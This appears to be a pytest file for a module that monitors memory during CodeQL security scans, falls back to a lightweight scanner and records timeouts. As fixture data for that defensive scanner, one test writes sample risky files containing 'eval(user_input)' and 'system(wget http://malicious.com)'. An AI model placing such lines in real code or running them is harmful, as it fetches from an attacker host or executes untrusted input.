# tests/test_resource_monitor.py
import pytest
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

def test_memory_monitor_initialization():
    """Test memory monitor setup"""
    from src.resource_monitor import MemoryMonitor

    monitor = MemoryMonitor(max_memory_gb=4)
    assert monitor.max_memory_gb == 4
    assert monitor.is_monitoring == False
    assert monitor.alert_threshold == 0.8  # Default value
    assert monitor.alert_threshold_gb == 3.2  # 80% of 4GB

def test_memory_monitor_custom_alert_threshold():
    """Test memory monitor with custom alert threshold"""
    from src.resource_monitor import MemoryMonitor

    monitor = MemoryMonitor(max_memory_gb=8, alert_threshold=0.75)
    assert monitor.max_memory_gb == 8
    assert monitor.alert_threshold == 0.75
    assert monitor.alert_threshold_gb == 6.0  # 75% of 8GB

def test_memory_monitor_start_stop():
    """Test starting and stopping memory monitoring"""
    from src.resource_monitor import MemoryMonitor

    monitor = MemoryMonitor(max_memory_gb=4)

    # Test starting monitoring
    monitor.start_monitoring()
    assert monitor.is_monitoring == True
    assert monitor.monitor_thread is not None
    assert monitor.peak_memory >= 0.0

    # Test stopping monitoring
    stats = monitor.stop_monitoring()
    assert monitor.is_monitoring == False
    assert "peak_memory_gb" in stats
    assert "max_memory_gb" in stats
    assert "monitoring_duration_seconds" in stats

def test_memory_monitor_alert_callback():
    """Test memory monitor alert callback functionality"""
    from src.resource_monitor import MemoryMonitor

    callback_called = threading.Event()
    callback_args = []

    def test_callback(current_gb, threshold_gb):
        callback_args.append((current_gb, threshold_gb))
        callback_called.set()

    monitor = MemoryMonitor(max_memory_gb=1, alert_threshold=0.5)  # Low threshold for testing

    # Mock high memory usage to trigger alert
    with patch('psutil.Process') as mock_process:
        mock_process_instance = Mock()
        mock_process.return_value = mock_process_instance

        # Simulate high memory usage that exceeds threshold
        mock_process_instance.memory_info.return_value.rss = 0.6 * 1024**3  # 0.6GB
        mock_process_instance.cpu_percent.return_value = 50.0

        monitor.start_monitoring(test_callback)

        # Wait a bit for monitoring to run and trigger alert
        callback_called.wait(timeout=1.0)

        monitor.stop_monitoring()

    # Verify callback was called
    assert callback_called.is_set()
    assert len(callback_args) > 0
    assert callback_args[0][0] > 0.5  # Current memory exceeds threshold
    assert callback_args[0][1] == 0.5  # Threshold

def test_robust_codeql_execution_import():
    """Test that robust_codeql_execution can be imported"""
    from src.resource_monitor import robust_codeql_execution
    assert callable(robust_codeql_execution)

def test_robust_codeql_execution_monitor_initialization():
    """Test that robust_codeql_execution properly initializes monitoring"""
    from src.resource_monitor import robust_codeql_execution, MemoryMonitor

    # Test that the function exists and creates MemoryMonitor correctly
    with tempfile.TemporaryDirectory() as temp_dir:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir()
        out_dir = Path(temp_dir) / "out"
        out_dir.mkdir()

        # This will fail at language detection but should not crash on monitor setup
        result = robust_codeql_execution(src_dir, out_dir, max_memory_gb=2)

        # Should fail gracefully, not crash
        assert "success" in result
        assert "error" in result or "fallback_used" in result

def test_run_lightweight_fallback():
    """Test lightweight fallback analysis"""
    from src.resource_monitor import run_lightweight_fallback

    with tempfile.TemporaryDirectory() as temp_dir:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir()
        out_dir = Path(temp_dir) / "out"
        out_dir.mkdir()

        # Create source files with potential security issues
        (src_dir / "safe.py").write_text("print('hello world')")
        (src_dir / "risky.py").write_text("eval(user_input)  # dangerous")
        (src_dir / "cmd.py").write_text("system(wget http://malicious.com)")

        memory_stats = {"peak_memory_gb": 1.5, "max_memory_gb": 2.0}
        original_error = "Memory error during full scan"

        result = run_lightweight_fallback(src_dir, out_dir, memory_stats, original_error)

        assert result["fallback_used"] == True
        assert result["success"] == True
        assert "findings_count" in result
        assert result["original_error"] == original_error
        assert (out_dir / "codeql_fallback_results.json").exists()

def test_run_lightweight_fallback_file_reading_errors():
    """Test lightweight fallback handles file reading errors gracefully"""
    from src.resource_monitor import run_lightweight_fallback

    with tempfile.TemporaryDirectory() as temp_dir:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir()
        out_dir = Path(temp_dir) / "out"
        out_dir.mkdir()

        # Create an unreadable file (binary)
        (src_dir / "binary.dat").write_bytes(b'\x00\x01\x02\xff')

        memory_stats = {"peak_memory_gb": 1.0}
        original_error = "Scan failed"

        result = run_lightweight_fallback(src_dir, out_dir, memory_stats, original_error)

        # Should handle unreadable files gracefully
        assert result["fallback_used"] == True
        assert result["success"] == True

def test_record_timeout_and_continue():
    """Test timeout recording functionality"""
    from src.resource_monitor import record_timeout_and_continue

    with tempfile.TemporaryDirectory() as temp_dir:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir()
        out_dir = Path(temp_dir) / "out"
        out_dir.mkdir()

        memory_stats = {"peak_memory_gb": 2.0, "monitoring_duration_seconds": 300}
        timeout_error = "CodeQL execution timed out after 600 seconds"

        result = record_timeout_and_continue(src_dir, out_dir, memory_stats, timeout_error)

        assert result["success"] == False
        assert result["timeout"] == True
        assert result["requires_manual_review"] == True
        assert result["error"] == timeout_error
        assert "partial_results_file" in result

        # Check that timeout record file was created
        record_file = Path(result["partial_results_file"])
        assert record_file.exists()

        # Verify content of timeout record
        import json
        with open(record_file) as f:
            record_data = json.load(f)

        assert record_data["status"] == "timeout"
        assert record_data["error"] == timeout_error
        assert record_data["requires_manual_review"] == True

def test_memory_monitor_get_stats():
    """Test getting current monitoring stats"""
    from src.resource_monitor import MemoryMonitor

    monitor = MemoryMonitor(max_memory_gb=4)

    # Test stats when not monitoring
    stats = monitor.get_stats()
    assert "is_monitoring" in stats
    assert stats["is_monitoring"] == False

    # Test stats when monitoring
    with patch('psutil.Process') as mock_process:
        mock_process_instance = Mock()
        mock_process.return_value = mock_process_instance
        mock_process_instance.memory_info.return_value.rss = 100 * 1024**2  # 100MB
        mock_process_instance.cpu_percent.return_value = 25.0

        monitor.start_monitoring()
        time.sleep(0.6)  # Let monitoring collect at least one sample

        stats = monitor.get_stats()
        assert "is_monitoring" in stats
        assert stats["is_monitoring"] == True
        assert "current_memory_gb" in stats
        assert "peak_memory_gb" in stats

        monitor.stop_monitoring()

def test_robust_codeql_execution_empty_directory():
    """Test robust execution with empty directory (will fail gracefully)"""
    from src.resource_monitor import robust_codeql_execution

    with tempfile.TemporaryDirectory() as temp_dir:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir()  # Empty directory - no source files
        out_dir = Path(temp_dir) / "out"
        out_dir.mkdir()

        result = robust_codeql_execution(src_dir, out_dir, max_memory_gb=2)

        # Should fail gracefully at language detection
        assert result["success"] == False
        assert "fallback_used" in result
        assert result["fallback_used"] == False

def test_robust_codeql_execution_function_signature():
    """Test robust_codeql_execution has correct function signature"""
    from src.resource_monitor import robust_codeql_execution
    import inspect

    sig = inspect.signature(robust_codeql_execution)
    expected_params = ['src_dir', 'out_dir', 'max_memory_gb', 'timeout_multiplier']

    assert len(sig.parameters) >= 3  # At least required params
    assert 'src_dir' in sig.parameters
    assert 'out_dir' in sig.parameters
    assert 'max_memory_gb' in sig.parameters